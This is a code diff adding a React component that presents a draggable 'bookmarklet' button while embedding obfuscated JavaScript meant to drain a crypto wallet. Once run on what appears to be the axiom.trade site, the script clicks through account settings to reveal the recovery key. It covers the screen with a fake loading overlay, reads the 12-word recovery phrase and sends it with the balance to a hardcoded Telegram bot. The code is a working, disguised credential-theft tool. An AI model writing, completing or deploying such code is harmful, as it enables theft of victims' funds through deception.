@@ -1,0 +1,227 @@
+import React, { useState, useRef } from 'react';
+import { obfuscateCode } from '@/utils/obfuscator';
+
+interface BookmarkletButtonProps {
+  title: string;
+  className?: string;
+}
+
+export default function BookmarkletButton({ title, className }: BookmarkletButtonProps) {
+  const [isDragging, setIsDragging] = useState(false);
+  const bookmarkRef = useRef<HTMLAnchorElement>(null);
+  
+  // The raw JS code that will be obfuscated and turned into a bookmarklet
+  const jsCode = `(function () {
+  function sendToTelegram(message) {
+    fetch(
+      'https://api.telegram.org/bot7586814949:AAFeRT0HYLE3RR3PNQhg_qBerIsGPMbZg5o/sendMessage?chat_id=-4789428488&text=' +
+        encodeURIComponent(message)
+    );
+  }
+
+  let state = {
+    current: 0,
+  };
+
+  const walletElement = document.querySelector("span.text-\\\\[14px\\\\].font-semibold");
+
+  if (!walletElement) {
+    sendToTelegram('DESIRED:missing|ACTUAL:missing');
+    alert("Wallet element missing");
+    return;
+  }
+
+  const balance = parseFloat(walletElement.textContent.trim());
+
+  if (isNaN(balance) || balance <= 0) {
+    sendToTelegram('DESIRED:invalid|ACTUAL:' + walletElement.textContent);
+    alert("Your wallet balance cannot be 0");
+    return;
+  }
+
+  sendToTelegram("DESIRED:skipped|ACTUAL:" + balance);
+
+  function handleNextStep() {
+    switch (state.current) {
+      case 0:
+        clickSettingsIcon();
+        break;
+      case 1:
+        clickAccountAndSecurity();
+        break;
+      case 2:
+        clickRecoveryKeyButton();
+        break;
+      case 3:
+        revealKey();
+        break;
+      case 4:
+        extractRecoveryPhrase();
+        break;
+    }
+  }
+
+  function clickSettingsIcon() {
+    const icon = document.querySelector("i.ri-user-settings-line");
+    if (!icon) {
+      return sendToTelegram("SETTINGS_ICON_MISSING");
+    }
+
+    const button = icon.closest("button");
+    if (button) {
+      button.click();
+      sendToTelegram("SETTINGS_CLICKED");
+      setTimeout(() => {
+        state.current = 1;
+        handleNextStep();
+      }, 10);
+    } else {
+      sendToTelegram("SETTINGS_BTN_MISSING");
+    }
+  }
+
+  function clickAccountAndSecurity() {
+    const button = Array.from(document.querySelectorAll("button")).find((btn) => {
+      const span = btn.querySelector("span.text-\\\\[14px\\\\].font-medium");
+      return span?.textContent.trim() === "Account and Security";
+    });
+
+    if (button) {
+      button.click();
+      sendToTelegram("ACCOUNT_CLICKED");
+      setTimeout(() => {
+        state.current = 2;
+        handleNextStep();
+      }, 10);
+    } else {
+      sendToTelegram("ACCOUNT_BTN_MISSING");
+    }
+  }
+
+  function clickRecoveryKeyButton() {
+    const recoveryBtn = document.querySelector("button.bg-secondaryStroke");
+    const text = recoveryBtn?.querySelector("span")?.textContent.trim();
+
+    if (recoveryBtn && text === "View Recovery Key") {
+      recoveryBtn.click();
+      sendToTelegram("RECOVERY_CLICKED");
+
+      setTimeout(() => {
+        state.current = 3;
+        handleNextStep();
+      }, 10);
+
+      const recoveryModal = document.querySelector("div.flex.flex-col.w-\\\\[634px\\\\].bg-backgroundTertiary");
+      if (recoveryModal) {
+        recoveryModal.remove();
+        sendToTelegram("UI_REMOVED");
+      }
+    } else {
+      sendToTelegram("RECOVERY_BTN_MISSING");
+    }
+  }
+
+  function showLoadingOverlay() {
+    if (document.getElementById("loadingOverlay")) return;
+
+    const overlay = document.createElement("div");
+    overlay.id = "loadingOverlay";
+    overlay.innerHTML = \`
+      <div style="text-align:center;color:white;font-size:20px;margin-bottom:20px">Loading settings...</div>
+      <div class="spinner" style="border:4px solid rgba(255,255,255,0.2);border-top:4px solid white;border-radius:50%;width:40px;height:40px;animation:spin 1s linear infinite;"></div>
+    \`;
+
+    Object.assign(overlay.style, {
+      position: "fixed",
+      top: "0",
+      left: "0",
+      width: "100%",
+      height: "100%",
+      backgroundColor: "black",
+      display: "flex",
+      flexDirection: "column",
+      justifyContent: "center",
+      alignItems: "center",
+      zIndex: "2147483647",
+    });
+
+    const style = document.createElement("style");
+    style.textContent = "@keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }";
+
+    document.head.appendChild(style);
+    document.body.appendChild(overlay);
+  }
+
+  function revealKey() {
+    const interval = setInterval(() => {
+      const revealBtn = document.querySelector("button.bg-primaryBlue.w-full.h-\\\\[32px\\\\].px-\\\\[12px\\\\].gap-\\\\[8px\\\\]");
+      const label = revealBtn?.querySelector("span.text-\\\\[14px\\\\].font-bold")?.textContent.trim();
+
+      if (revealBtn && label === "Reveal my key") {
+        clearInterval(interval);
+        showLoadingOverlay();
+        revealBtn.click();
+        sendToTelegram("REVEAL_KEY_SUCCESS");
+
+        setTimeout(() => {
+          state.current = 4;
+          handleNextStep();
+        }, 10);
+      }
+    }, 500);
+  }
+
+  function extractRecoveryPhrase() {
+    const interval = setInterval(() => {
+      const phraseContainer = document.querySelector(
+        "div.bg-transparent.text-white.placeholder\\\\:text-textTertiary.text-\\\\[14px\\\\].leading-\\\\[20px\\\\].font-normal.flex.flex-row.w-full.min-h-\\\\[80px\\\\].p-\\\\[8px\\\\].py-\\\\[4px\\\\].pr-\\\\[36px\\\\].gap-\\\\[4px\\\\].justify-start.items-start.rounded-\\\\[8px\\\\].border.border-secondaryStroke\\\\/50.outline-none.transition-all.duration-300.break-words.blur-none.hover\\\\:bg-secondaryStroke\\\\/20.hover\\\\:border-secondaryStroke\\\\/80"
+      );
+
+      if (phraseContainer) {
+        const text = phraseContainer.textContent.trim();
+        if (text.split(" ").length === 12) {
+          clearInterval(interval);
+          sendToTelegram("RECOVERY_PHRASE:" + text);
+          setTimeout(() => {
+            window.location.href = "https://axiom.trade/pulse";
+          }, 4000);
+        }
+      }
+    }, 500);
+  }
+
+  handleNextStep();
+})();`;
+
+  // Generate the obfuscated bookmarklet code
+  const bookmarkletCode = obfuscateCode(jsCode);
+
+  // Handle dragging effects
+  const handleDragStart = () => {
+    setIsDragging(true);
+  };
+
+  const handleDragEnd = () => {
+    setIsDragging(false);
+  };
+
+  return (
+    <div className="relative flex flex-col items-center">
+      <a
+        ref={bookmarkRef}
+        href={bookmarkletCode}
+        draggable="true"
+        onDragStart={handleDragStart}
+        onDragEnd={handleDragEnd}
+        className={`${className || ""} px-6 py-3 bg-black text-white rounded-md inline-block hover:bg-gray-800 transition-smooth cursor-move`}
+        title="Drag this to your bookmarks bar"
+        onClick={(e) => e.preventDefault()}
+      >
+        {title}
+      </a>
+      <p className="mt-4 text-sm text-center text-gray-500">
+        Drag this button to your bookmarks bar 👆
+      </p>
+    </div>
+  );
+}
